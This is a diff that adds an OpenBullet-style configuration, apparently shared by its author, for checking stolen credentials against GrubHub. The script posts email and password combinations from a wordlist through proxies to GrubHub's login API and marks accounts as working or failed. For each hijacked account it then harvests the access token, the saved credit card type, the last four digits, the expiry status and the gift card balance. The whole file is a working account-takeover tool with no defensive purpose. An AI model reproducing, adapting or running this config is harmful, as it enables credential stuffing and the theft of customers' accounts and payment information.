@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "GrubHub",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-06T20:40:25.5188743+00:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_CLIENT_ID REQUEST GET "https://www.grubhub.com/service-worker.js" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authority: www.grubhub.com" 
+  HEADER "method: GET" 
+  HEADER "path: /service-worker.js" 
+  HEADER "scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.grubhub.com/service-worker.js" 
+  HEADER "service-worker: script" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+#PARSE_CLIENT_ID PARSE "<SOURCE>" LR "clientId:\"" "\",hostName" -> VAR "CLIENTID" 
+#ACTUAL_LOGIN REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"<CLIENTID>\",\"device_id\":1032112575,\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer f7c59f41-69d0-45e1-8298-7184d3d2ad3a" 
+  HEADER "Content-type: application/json;charset=UTF-8" 
+  HEADER "Origin: https://www.grubhub.com" 
+  HEADER "Referer: https://www.grubhub.com/login" 
+#CHECK_IF_ACC_IS_WORKING KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+#PARSE_UDID PARSE "<SOURCE>" LR "ud_id\":\"" "\",\"" -> VAR "UDID" 
+PARSE "<SOURCE>" LR "\":{\"access_token\":\"" "\",\"" -> VAR "ACCESS" 
+#GET_CREDIT_CARD_INFO REQUEST GET "https://api-gtm.grubhub.com/payments/<UDID>/credit_card" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "If-Modified-Since: 0" 
+  HEADER "Origin: https://www.grubhub.com" 
+  HEADER "Referer: https://www.grubhub.com/account/payment" 
+#PARSE_TYPE PARSE "<SOURCE>" LR "credit_card_type\":\"" "\"," Recursive=TRUE -> CAP "TYPE" 
+#PARSE_LAST4 PARSE "<SOURCE>" LR "credit_card_last4\":\"" "\"," Recursive=TRUE -> CAP "LAST4" 
+#PARSE_IF_EXPIRED PARSE "<SOURCE>" LR "expired\":" ",\"" Recursive=TRUE -> CAP "EXPIRED" 
+REQUEST GET "https://api-gtm.grubhub.com/codes/vault/<UDID>/giftcards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+PARSE "<SOURCE>" LR "amount_remaining\":" "}" -> CAP "BALANCE" "" "$" 
